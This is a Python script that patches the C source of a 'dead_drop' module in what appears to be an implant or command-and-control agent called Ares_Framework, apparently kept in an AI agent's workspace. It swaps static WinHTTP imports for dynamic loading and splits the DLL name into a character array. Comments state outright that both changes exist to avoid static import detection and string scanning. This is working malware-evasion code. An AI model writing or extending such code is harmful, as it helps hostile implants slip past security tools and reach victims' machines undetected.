#!/usr/bin/env python3
"""Patch dead_drop.c to use dynamic WinHTTP loading."""
import re, sys

path = r"C:\Users\Admin\.openclaw\workspace\Ares_Framework\agent\native\dead_drop.c"
with open(path, "r", encoding="utf-8") as f:
    content = f.read()

OLD_INC = '#include "ares_config.h"\n#include <winhttp.h>\n#include <string.h>'
NEW_INC = r'''#include "ares_config.h"
#include <string.h>
/* WinHTTP loaded dynamically - avoids static import detection */
typedef LPVOID HINTERNET;
#define WINHTTP_ACCESS_TYPE_DEFAULT_PROXY 0
#define WINHTTP_FLAG_SECURE               0x00800000
#define WINHTTP_ADDREQ_FLAG_ADD           0x20000000
#define WINHTTP_NO_REFERER                NULL
#define WINHTTP_DEFAULT_ACCEPT_TYPES      NULL
#define WINHTTP_NO_ADDITIONAL_HEADERS     NULL
#define WINHTTP_OPTION_CONNECT_TIMEOUT    3
#define WINHTTP_OPTION_SEND_TIMEOUT       5
#define WINHTTP_OPTION_RECEIVE_TIMEOUT    6

typedef HINTERNET (WINAPI *pfn_WinHttpOpen)(LPCWSTR,DWORD,LPCWSTR,LPCWSTR,DWORD);
typedef HINTERNET (WINAPI *pfn_WinHttpConnect)(HINTERNET,LPCWSTR,WORD,DWORD);
typedef HINTERNET (WINAPI *pfn_WinHttpOpenRequest)(HINTERNET,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR*,DWORD);
typedef BOOL (WINAPI *pfn_WinHttpAddRequestHeaders)(HINTERNET,LPCWSTR,DWORD,DWORD);
typedef BOOL (WINAPI *pfn_WinHttpSendRequest)(HINTERNET,LPCWSTR,DWORD,LPVOID,DWORD,DWORD,DWORD_PTR);
typedef BOOL (WINAPI *pfn_WinHttpReceiveResponse)(HINTERNET,LPVOID);
typedef BOOL (WINAPI *pfn_WinHttpQueryDataAvailable)(HINTERNET,LPDWORD);
typedef BOOL (WINAPI *pfn_WinHttpReadData)(HINTERNET,LPVOID,DWORD,LPDWORD);
typedef BOOL (WINAPI *pfn_WinHttpSetOption)(HINTERNET,DWORD,LPVOID,DWORD);
typedef BOOL (WINAPI *pfn_WinHttpCloseHandle)(HINTERNET);

static pfn_WinHttpOpen              _ddWinHttpOpen;
static pfn_WinHttpConnect           _ddWinHttpConnect;
static pfn_WinHttpOpenRequest       _ddWinHttpOpenRequest;
static pfn_WinHttpAddRequestHeaders _ddWinHttpAddRequestHeaders;
static pfn_WinHttpSendRequest       _ddWinHttpSendRequest;
static pfn_WinHttpReceiveResponse   _ddWinHttpReceiveResponse;
static pfn_WinHttpQueryDataAvailable _ddWinHttpQueryDataAvailable;
static pfn_WinHttpReadData          _ddWinHttpReadData;
static pfn_WinHttpSetOption         _ddWinHttpSetOption;
static pfn_WinHttpCloseHandle       _ddWinHttpCloseHandle;

static BOOL _dd_load_winhttp(void) {
    static BOOL loaded = FALSE;
    if (loaded) return TRUE;
    /* Char array avoids "winhttp.dll" string literal in binary */
    char name[] = {'w','i','n','h','t','t','p','.','d','l','l',0};
    HMODULE h = LoadLibraryA(name);
    if (!h) return FALSE;
    _ddWinHttpOpen              = (pfn_WinHttpOpen)GetProcAddress(h, "WinHttpOpen");
    _ddWinHttpConnect           = (pfn_WinHttpConnect)GetProcAddress(h, "WinHttpConnect");
    _ddWinHttpOpenRequest       = (pfn_WinHttpOpenRequest)GetProcAddress(h, "WinHttpOpenRequest");
    _ddWinHttpAddRequestHeaders = (pfn_WinHttpAddRequestHeaders)GetProcAddress(h, "WinHttpAddRequestHeaders");
    _ddWinHttpSendRequest       = (pfn_WinHttpSendRequest)GetProcAddress(h, "WinHttpSendRequest");
    _ddWinHttpReceiveResponse   = (pfn_WinHttpReceiveResponse)GetProcAddress(h, "WinHttpReceiveResponse");
    _ddWinHttpQueryDataAvailable= (pfn_WinHttpQueryDataAvailable)GetProcAddress(h, "WinHttpQueryDataAvailable");
    _ddWinHttpReadData          = (pfn_WinHttpReadData)GetProcAddress(h, "WinHttpReadData");
    _ddWinHttpSetOption         = (pfn_WinHttpSetOption)GetProcAddress(h, "WinHttpSetOption");
    _ddWinHttpCloseHandle       = (pfn_WinHttpCloseHandle)GetProcAddress(h, "WinHttpCloseHandle");
    loaded = (_ddWinHttpOpen != NULL);
    return loaded;
}'''

if OLD_INC not in content:
    print("[!] Include block not found, trying alternate")
    # Maybe already patched or slight variation
    if '_dd_load_winhttp' in content:
        print("[=] Already patched")
        sys.exit(0)
    sys.exit(1)

content = content.replace(OLD_INC, NEW_INC)

# Replace direct WinHttp calls with _dd* versions
funcs = [
    "WinHttpOpen", "WinHttpConnect", "WinHttpOpenRequest",
    "WinHttpAddRequestHeaders", "WinHttpSendRequest", "WinHttpReceiveResponse",
    "WinHttpQueryDataAvailable", "WinHttpReadData", "WinHttpSetOption", "WinHttpCloseHandle"
]
for fn in funcs:
    content = re.sub(r'\b' + fn + r'\s*\(', f'_dd{fn}(', content)

# Add load call at start of _dd_http_get body
content = content.replace(
    "    HINTERNET hSession = _ddWinHttpOpen(",
    "    if (!_dd_load_winhttp()) return FALSE;\n    HINTERNET hSession = _ddWinHttpOpen("
)

with open(path, "w", encoding="utf-8") as f:
    f.write(content)
print("[+] dead_drop.c patched: WinHTTP now loaded dynamically")
